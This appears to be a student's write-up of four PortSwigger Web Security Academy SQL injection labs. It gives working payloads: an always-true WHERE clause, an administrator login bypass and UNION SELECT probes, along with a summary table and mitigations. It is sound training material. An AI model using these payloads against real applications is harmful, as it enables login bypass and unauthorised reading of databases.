# SQL Injection Payloads

Payloads used across the 4 labs completed on PortSwigger Web Security Academy
(SQL injection learning path). All labs were run on isolated, disposable lab
instances provided by PortSwigger — no real or production systems were tested.

---

## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Injection point:** `category` parameter in the product filter URL

```
Corporate gifts' OR 1=1--
```

**Full example request:**
```
GET /filter?category=Corporate+gifts'+OR+1=1--
```

**Effect:** turns the WHERE clause into an always-true condition, so the
query returns every row in the `products` table, including unreleased /
hidden items, instead of only the selected category.

---

## Lab 2: SQL injection vulnerability allowing login bypass

**Injection point:** `username` field on the login form

```
Username: administrator'--
Password: anything
```

**Effect:** the `--` comments out the rest of the SQL query (including the
password check), so the database only verifies that a user named
`administrator` exists — logging the attacker in without a valid password.

---

## Lab 3: SQL injection UNION attack — determining the number of columns

**Injection point:** `category` parameter in the product filter URL

Tried in sequence, incrementing the number of `NULL`s until no error was returned:

```
Gifts' UNION SELECT NULL--
Gifts' UNION SELECT NULL,NULL--
Gifts' UNION SELECT NULL,NULL,NULL--
```

**Result:** 3 columns — the third payload loaded without error, confirming
the underlying query returns exactly 3 columns.

---

## Lab 4: SQL injection UNION attack — finding a column containing text

**Injection point:** `category` parameter in the product filter URL

Using the 3-column count from Lab 3, tried the target string in each column position:

```
Clothing, shoes and accessories' UNION SELECT 'gTP2P5',NULL,NULL--
Clothing, shoes and accessories' UNION SELECT NULL,'gTP2P5',NULL--
```

**Result:** column 2 accepted string data — the second payload returned the
target string (`gTP2P5`) in the product listing and solved the lab.

---

## Summary table

| Lab | Technique | Payload |
|---|---|---|
| 1 | WHERE clause / boolean injection | `' OR 1=1--` |
| 2 | Authentication bypass | `administrator'--` |
| 3 | UNION — column count | `' UNION SELECT NULL,NULL,NULL--` |
| 4 | UNION — column type (text) | `' UNION SELECT NULL,'gTP2P5',NULL--` |

## Mitigations (see full report for detail)

- Parameterised queries / prepared statements
- Input validation and allow-listing
- Least-privilege database accounts
- Generic error messages (no verbose DB errors to the client)
- Web Application Firewall (WAF) as defence-in-depth
